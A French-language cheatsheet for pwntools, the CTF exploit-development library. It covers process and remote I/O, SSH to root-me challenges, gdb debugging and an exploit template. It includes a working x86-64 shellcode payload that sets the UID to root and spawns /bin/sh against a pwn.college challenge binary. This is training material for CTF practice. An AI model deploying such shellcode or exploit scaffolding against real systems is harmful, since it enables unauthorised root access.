---
title: 'Pwntools'
date: 2023-02-20
draft: trash
description: "fa-solid fa-file-lines fa-fw fa-sm"
categories:
  - pwn
  - cheatsheet
tags:
  - pwn
  - cheatsheet
---

https://github.com/Gallopsled/pwntools

Pwntools est un CTF framework et une librairie python conçus pour le développement d’exploits. Pwntools a pour but de rendre le développement d’exploits le plus simple et rapide possible. Il vient en 2 parties : *_pwn_* pour les CTFs et *_pwnlib_* une version plus clean et “professinnelle” du projet.


## Create and Interact with Process
```python
import pwn

p = pwn.process(["/usr/bin/python3", "-c", "'print(hello)'"])

p.write("hello")       # -> send : "hello"
p.writeline("hello")   # -> send : "hello\n"

output = p.read(<length>)
output = p.readline()
output = p.readuntil('some string')
output = p.readall()

# p.readuntil('some string') ; p.write(b'aaaa')
p.writeafter('some string', b'aaaa')

# p.readuntil('some string') ; p.writeline(b'aaaa')
p.writelineafter('some string', b'aaaa')

# interacting with the process manually
p.interactive()

# waiting for the process to finish
p.wait()
```

## Remote
Ici les appels à fonctions ont été fait dans un contexte ou le process est lancé en local. Il est tout à fait possible de faire la même chose en remote.
```python
# Socket
io = remote('127.0.0.1', 1337)                # Bind
io = listen(8080).wait_for_connection()       # Reverse

# SSH Connect
s = ssh(host='challenge02.root-me.org',user='app-systeme-ch15',password='app-systeme-ch15',port=2222)
p = s.process('./ch15')

p.send("hello")       # -> send : "hello"
p.sendline("hello")   # -> send : "hello\n"

output = p.recv(<length>)
output = p.recvline()
output = p.recvuntil('some string')
output = p.recvall()
```

## Context and Environment
```python
# Add environment variables
p = pwn.process(["/usr/bin/python3", "-c", "'print(hello)'"], env={'TEST':'test'})
```

## Play with Stdin/Stdout
```python
# Redirect file output to process stdin
fd = open('input.txt', 'r')
p = process(['/usr/bin/cat', '/flag.txt'], stdin=fd)

# Redirect process output to a file
fd = open("output.txt", "w")
p = process(['/usr/bin/cat', '/flag.txt'], stdout=fd)
```

## Shellcode
```python
import pwn

p = pwn.process(['/challenge/babyshell_level5'])

pwn.context.update(arch='amd64', os='linux')
payload = pwn.asm(f"""
.global _start
_start:
.intel_syntax noprefix
	
# Set Real UID to root(0)
	xor rax, rax
	mov al, 0x71
	xor rdi, rdi
	xor rsi, rsi
	syscall
	
# Call /bin/sh
	xor rbx, rbx
	push rbx                          # on push un null byte sur la stack pour la fin de la string du path de /bin/sh
	mov rbx, 0x68732f6e69622f2f       # on push /bin/sh sur la stack
	push rbx
	xor rax, rax
	mov al, 59
	xor rdi, rdi
	mov rdi, rsp                      # on récupère "/bin/sh\0" depuis la stack
	xor rsi, rsi
	xor rdx, rdx
	syscall
""")

p.write(payload)

p.interactive()

p.wait()
```

## Debugging
Tout d'abord, le server qui héberge le binaire que l'on souhaite debug doit avoir _**gdb**_ et _**gdbserver**_ d'installé.

```python
# Debug à partir de la toute première instruction
io = gdb.debug("/bin/bash", gdbscript='continue')

# Debug un process
io = process('/bin/sh')
gdb.attach(io, gdbscript='continue')

# Debug en remote
io = remote('localhost', 4141)
gdb.attach(io)

# Debug en ssh
context.terminal = "/Applications/iTerm.app/Contents/MacOS/iTerm2" #(Dépend de l'environement graphique, ex: /usr/bin/i3-sensible-terminal)
s = ssh(host='challenge02.root-me.org',user='app-systeme-ch7',password='app-systeme-ch7',port=2222)
io = s.process(['./ch7', payload])
gdb.attach(io, gdbscript=f"""
    b *main
    continue
""")

io.sendline('break main')
io.recvline()
io.interactive()

```

## Template
```python title:pwntools_template.py
#!/usr/bin/python3.9
from pwn import *

if not args.BLIND:
    context.binary = elfexe = ELF('./src') #FIXME
#    libc = ELF('<libc-used-by-target>') #FIXME

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    elf_path = '/challenge/run'
    if args.REMOTE:
        remote_server = 'dojo.pwn.college'   #FIXME
        remote_port = 22         #FIXME

        if args.SSH:
            s = ssh('hacker', remote_server, remote_port, keyfile='/home/ego/.ssh/id_ed25519')
            if args.GDB:
                if not args.BLIND:
                    return gdb.debug([elf_path] + argv, gdbscript, elfexe.path, ssh=s, *a, *kw)
                else:
                    return gdb.debug([elf_path] + argv, gdbscript, ssh=s, *a, *kw)
            else:
                target = s.process([elf_path] + argv, *a, **kw)
        else:
            target = remote(remote_server, remote_port)
    else:
        if args.GDB:
            if not args.BLIND:
                return gdb.debug([elf_path] + argv, gdbscript, elfexe.path, *a, *kw)
            else:
                return gdb.debug([elf_path] + argv, gdbscript, *a, *kw)
        else:
            target = process([elf_path] + argv, *a, **kw)
    return target

gdbscript = '''
# init-gef
# target record-full # Not supported with AVX instructions yet

# b *main
# command
#     printf "argv ptr: %p\\n",$rsi
# end

# continue
'''.format(**locals())
if args.GDB:
    log.info('Using gdb script:\n'+gdbscript)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

arguments = []
io = start(arguments)

io.interactive()
io.close()
```
## Play with files
https://docs.pwntools.com/en/dev/filesystem.html
## Troubleshootings
Dans le cas où on a des erreurs et que l'on a besoin de comprendre ce qui se passe en détail dans pwntools, on peut utiliser l'option `debug`.

```
# Debug global
context.log_level='debug'

# Debug local
io = gdb.debug('/bin/sh', log_level='debug')
```

https://github.com/Gallopsled/pwntools-tutorial/blob/master/debugging.md#troubleshooting
